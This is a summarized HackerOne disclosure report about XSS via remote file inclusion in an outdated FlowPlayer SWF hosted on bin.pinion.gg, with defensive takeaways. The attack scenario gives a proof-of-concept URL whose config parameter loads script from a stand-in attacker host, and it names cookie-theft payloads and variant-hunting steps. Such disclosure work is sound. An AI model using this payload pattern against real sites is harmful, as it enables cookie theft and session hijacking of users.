# Persistent XSS via Outdated FlowPlayer SWF with Remote File Inclusion on bin.pinion.gg

## Metadata
- **Source:** HackerOne
- **Report:** 254269 | https://hackerone.com/reports/254269
- **Submitted:** 2017-07-28
- **Reporter:** sp1d3rs
- **Program:** Pinion
- **Bounty:** Not specified
- **Severity:** high
- **Vuln:** Cross-Site Scripting (XSS), Remote File Inclusion (RFI), Insecure Deserialization
- **CVEs:** None
- **Category:** web-api

## Summary
An outdated FlowPlayer SWF file (version 3.2.15) hosted on bin.pinion.gg contains a remote file inclusion vulnerability that allows arbitrary JavaScript execution. Attackers can inject malicious JavaScript through the config parameter, leading to XSS, cookie theft, session hijacking, and cross-domain attacks.

## Attack scenario
1. Attacker discovers the vulnerable FlowPlayer SWF file at http://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf through subdomain recon
2. Attacker crafts a malicious JavaScript payload and hosts it on attacker-controlled server (test.js with XSS payloads)
3. Attacker constructs URL with config parameter: http://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf?config=http://attacker.com/test.js
4. When victim visits the URL or is redirected to it, the SWF file loads and executes the remote JavaScript in victim's browser context
5. Executed JavaScript can steal cookies (document.cookie), access sensitive data (document.domain), perform actions on behalf of user, or deface content
6. If the SWF is embedded in web applications or used across pinion.gg domains, the vulnerability enables cookie manipulation and cross-domain attacks

## Root cause
FlowPlayer version 3.2.15 lacks proper validation of the config parameter, allowing it to load and execute JavaScript from arbitrary remote sources. The application did not implement Content Security Policy, URL whitelisting, or update to patched versions of FlowPlayer.

## Attacker mindset
Reconnaissance-driven attacker identifying outdated third-party components on out-of-scope subdomains, recognizing known CVEs in legacy libraries, and chaining seemingly isolated vulnerabilities to compromise main domains through cookie setting and cross-domain attacks.

## Defensive takeaways
- Maintain an inventory of all third-party components (SWF, JavaScript libraries, plugins) and their versions
- Implement automated scanning for known vulnerabilities in dependencies, even on out-of-scope subdomains
- Apply strict Content Security Policy headers to prevent loading external scripts
- Implement URL whitelisting for any configuration-based file loading mechanisms
- Remove or deprecate legacy plugins (Flash/SWF files) that are no longer actively maintained
- Regularly update all third-party libraries to latest security-patched versions
- Monitor subdomain usage and document which subdomains host critical vs. non-critical assets
- Implement SameSite cookie attribute to prevent cross-domain cookie manipulation
- Use HTTPS and certificate pinning for critical assets

## Variant hunting
Scan for other outdated Flash/SWF files on company subdomains (*.pinion.gg, *.cp-ng.pinion.gg)
Check for other versions of FlowPlayer with similar RFI vulnerabilities
Search for similar config/configURL/source parameters in other media player implementations
Look for other cached manifest files that reference vulnerable resources
Test other parameter names (flashvars, config, source, configUrl) for RFI on any Flash content
Check if the SWF is embedded in third-party ads or widgets that could amplify attack surface

## MITRE ATT&CK
- T1190
- T1566
- T1104
- T1539
- T1185
- T1583.001

## Notes
This vulnerability demonstrates the risk of legacy technologies persisting on 'out-of-scope' subdomains. The attacker cleverly identified that seemingly non-critical assets can still impact main domain security through cookie manipulation and cross-domain exploitation. The manifest file itself was the reconnaissance vector leading to vulnerability discovery. FlowPlayer 3.2.15 is from 2013-2014 era and known to have RFI issues.

## Full report
<details><summary>Expand</summary>

##Description
Hi. Today i looked to some outscope subdomains *.pinion.gg for recon purposes.
I discovered an interesting file on http://templ4d2.pinion.gg/motd2.manifest with next content:
```
CACHE MANIFEST
# 2014-07-07
CACHE:
http://bin.pinion.gg/bin/companions.min.js
http://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf
http://vox-static.liverail.com/crossdomain.xml
http://cdn-static.liverail.com/crossdomain.xml
http://bs.serving-sys.com/crossdomain.xml
http://ad-apac.doubleclick.net/crossdomain.xml
http://ads.intergi.com/crossdomain.xml
http://u-ads.adap.tv/crossdomain.xml
http://imasdk.googleapis.com/js/sdkloader/ima3.js
http://www.googletagservices.com/tag/js/gpt.js
https://www.google-analytics.com/ga.js
http://partner.googleadservices.com/gpt/pubads_impl_90.js
NETWORK:
*
```

One string attracted my attention - http://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf
I submitted previously some vulnerabilities connected with this file to other programs, so easily determined that it is an outdated version of FlowPlayer (https://github.com/flowplayer/), vulnerable to XSS through remote file inclusion.

##POC
http://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf?config=http://████████/test.js
Just visit this link. Player will load my remote .js file from the my host, and display few popups with document.cookie and document.domain payloads.

##Impact
The vulnerable file is hosted on out-scope subdomain, so i thinked, how it can affect security of main domains.
1) Using bin.pinion.gg deface. Because attacker can execute any JS, he can deface the page by arbitrary content
2) Using Open Redirect through `window.location` js payload.
3) Using setting cookie cross-domain. In this case the attacker can set arbitrary cookies to the pinion.gg or cp-ng.pinion.gg.
4) If this file is used in some instance to display some content, ads, etc. - then the instance is vulnerable to XSS.

##Reproduction steps
You just need to place the malicious file to the remote host, like in this example:
http://████/test.js
and append the url to the
```
http://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf?config=
```
as parameter.

##Suggested fix
I recommend you to update FlowPlayer to the latest version, or remove if not used.

</details>

---
*Analysed by Claude on 2026-05-12*
